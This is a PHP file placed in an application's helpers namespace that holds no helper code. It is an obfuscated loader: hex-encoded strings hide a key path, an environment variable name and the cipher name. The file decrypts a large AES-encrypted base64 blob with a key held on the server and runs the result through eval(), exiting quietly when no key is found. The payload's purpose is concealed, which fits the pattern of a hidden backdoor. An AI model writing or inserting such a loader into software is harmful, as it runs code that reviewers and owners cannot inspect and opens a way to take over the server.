<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('1w37Lh70H26UAbv+43XhIw==');

$c=base64_decode(

'NsJ9vLhyr9CJzfoD6CK+3GPo3cP0WHH2OKTCO8SEplACiVnPYet86zaZayFuukrlTJLKvWLlLJZg' .
'yx6hafL+8P83lZm6DAtn2zPes1k3lKU+RYkihNSJFMuKtfYIOWj7Xy4H0w8h7GBR7yZvGZ21RYns' .
'sSmXjhia8zhV95eRIbxEp/qJCoVYz6UqiBX3LMFv1wFJe8HQp0LpzH1aXgTiXb184KgLb0R7ouPj' .
'W2SiC5ptLn+mcGiUsfxcTfrAZuuDncfYOmk+HF8lWl9ii9j6NOQTnDHCmFBlUe5mKhgC8R4+4zDc' .
'zoJLbnarqOtsFJFzTjSFrXJ8vEx3+eFJsigOn276ZMY94LjSp3c+tewg45OGPDGuGZYDRyQ1pH+q' .
'HmO21wIQj9Vi0+m6VznatOCfmHumRp7M1ThedItZILmwZAychKbn3s5GmKHReNwKBP2WJ5OuU32S' .
'edU08gUNXYlTQx6k1orN+xxmd8+8XiqIq0/f9ES6p887rb1iHt5NpEh9yExyd/+ajzQAXJyUpxuB' .
'2BFRHWPAnXDE8JI7l60XhIcg5xx/0XTGCPrebxF9OzMu4gbP3q1dQV+Okx/Fgo7i5c9ituZs6Vo3' .
'Y7yDxiQq2IefikKWsmCV1Sy4hVUeRi+Zu3z2ueaG+3dqnfp0dHQEdWKn0AqIHC8gnOeyWSX4lkIx' .
'HB0udghdnsBYr1DrZXw7g1DNxXdE5pY89EoXs/4HReldggGuAWyy5selR+AP/MFEW8YUFLi0GBzu' .
'xZidfFonWrJoDMDIgcrNkTg3f65usXCkQbFuj2GKgi/yistAuMdYycJjwo5pYGioFs/sWl/HN/1L' .
'C8LSnopRfeUOTX3LtMbd17wKlPaKpS2Oo5CUcn+xyY0UxbYIxmIv68WiTS8nf2T5IAqLCnI/dqFx' .
'gkNrckZnjAElBY+Eb9AiWw35y99ke8OVym0Ks6m9tPAK/AGXqDZ0RKP5i9XcHILWjiEVug3lrw02' .
'9w/YlpGAZ5lZBt3yLoM7N/P3ZcycmNdvyVPHoTOmSd2Tkn1wzHCotVW2Z8F+9w2i0PARBIawG1qX' .
'N1Yopi54j78pvPq+GBfFmdNz8fIzIhAvUMHP6ypNdyut8AJ2ggSyg0tYEhBI46x0gejpN4RCWg3s' .
'cewNPNfucQNXiqEF8sB70r5vEWbDILieyWzrMrGXN4jxbjJM7bzVpAZX+qkDDCB8+YSlV1s2TD40' .
'CS+gh/xaU8PecK8nIdq7E4hW3Qy17QtvmpCXjCMEXcW8N+4cFdJ2a9+iJfWrY3Kc2i632qpb2WqS' .
'93BgZiRhcBn6/I7Vt2VPXnYNRjO9f3Civjzbj2jKaLeZ7o+35/clvo9vbsl+CU0K91MmoszEsUJE' .
'335KWvZjwvsgBMWIlYVyeD2BMzFYqt5vmUnaN/oY6dBWxVHQsSyGD75VieX7ORJjRcyBcs7QhBrw' .
'PaOppqWm0z0ef5AKvH0zaf84kZT/MsKagI9g9kNVtCHt6+PY/36REq5Ju1UQKlXZqCqnXOKGC4Rt' .
'cXPUuwZwI3tYwrElihaLjMlly+ZC+/naHQxOACpWNBDhcYjKcC3oLkhACBT27bNFQENnzeEM8XRP' .
'h5m827zw+K3qtF8JPqf55RCi3nmaRIQWeFAbAYDxRhF/PYWKz+CQ9U45ZY2f3rBNzhb6EWC/QgzG' .
'1AFqwq/E0D32ntdg38PxJsR5lARCTFLkcZsSwZaOExLqtEi9yoKD2WLUaad/XS6yoSzW0uWYhIJm' .
'ko1wQo6O+JJvoET4wjg9B+bk/5mFj3G17glbJ5+ErIyWYMz+/i1S3ysMTR5inKivKxfNWQUrpEzm' .
'a7a3M1yEBx5LnSkTZ5Wgw1mltwModRCMy2MFmtWVge3baNtKt5cKifNIsfbFdCCDWJg6ZEHoT2VD' .
'I6jRn/FdXdPEgcON+9V4l3owGIqNvOdzR/XzH7/hiU/k9MQ6INUTf/DTxyO/Zs2J+fWCfYjqnn3h' .
'yQq7TVS0CmebeBJVtXpIKW/o2fBnstvM2oGbxMvMArUXHbhrA9Y8R3wl2VQPmC9FMiAkp2ozzymF' .
'iMZohIzcKt5ZA8eveAM6Xkcxz0+zV7RYA6j3Muo4GTBNo6NqM72SEBRr1tmblrQr/AC9VadbreEM' .
'qPxFyUHaGRhtOj2C2JR7GWKYJeTGuQaqFJs07vkyZ5hTm0IqjYaY4/CbNngKUYBB1QQoFR/rsJVP' .
'tUoWoogWj/yWmJ+ePTdZkVZTJKxPrTUpMZAZVo/Sbo11MoO/TvSXIKxfdEt5s8GOCfLE8YrwNT/Y' .
'VdH8qyEHH461PAcvzmRAZpuHmdITDfmqz/94YyvP/VbC+TlbxhIE54KouLLn0nAl3INEs1RRX0Kx' .
'tS5mNt3vu/M3U07mAWbl1b/eLC/rvCXdd1iXEa/5stIs5d+Ny2VvfMGiWlLQPU7Rz2oXlm91iwWN' .
'3+Y/yPYfDAdmwXaHOGsmngye05KNEQ9fsH820I4KjGsj1Xu22VJo3QVesLvcGr0GAhvWPM24Byat' .
'iGfAgwqrd7KaHpmKgfUuzdPYhKCu8qiufyAQLIi1JiXTcLibzG/SM8/sUfpR0L4Vt7EXqle0/v9h' .
'jf/lhtgGS2+7hj5krxjbUBafWQt2/G4WJ94D0BXZH3lPmpJNKVz4dJyXRnnf2gdKqppchjoQpJ0E' .
'3rVnKKU5yFn1+oEUPBEePr6wShH3SvkugrVwSsyf3xuLtvvhd61n/H3JTd/3EMWydnP+xueCpS8/' .
'ws7MMFJ/qC50FuBWxO1To02DoInr5EQ6rbCAUFRwojrP7ek0HWfVknz/CzS5z9USTAb+k/dWHd07' .
'x7pP4Ih31ay7EPka3r8c3KblyWoo16z87xhWuGex94mqMUiZ3BAONUcZqi7jWh1GhlpI3pifklM8' .
'JhDnNp3gu0YbXAGKZVCbUbduUvAsv9QCFLrO6XKHcMPCUJ3/FbLIU3P0cgXziadlysxUeVAEffyq' .
'IBNqCyQTYd0Y85g+xKerlgE='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

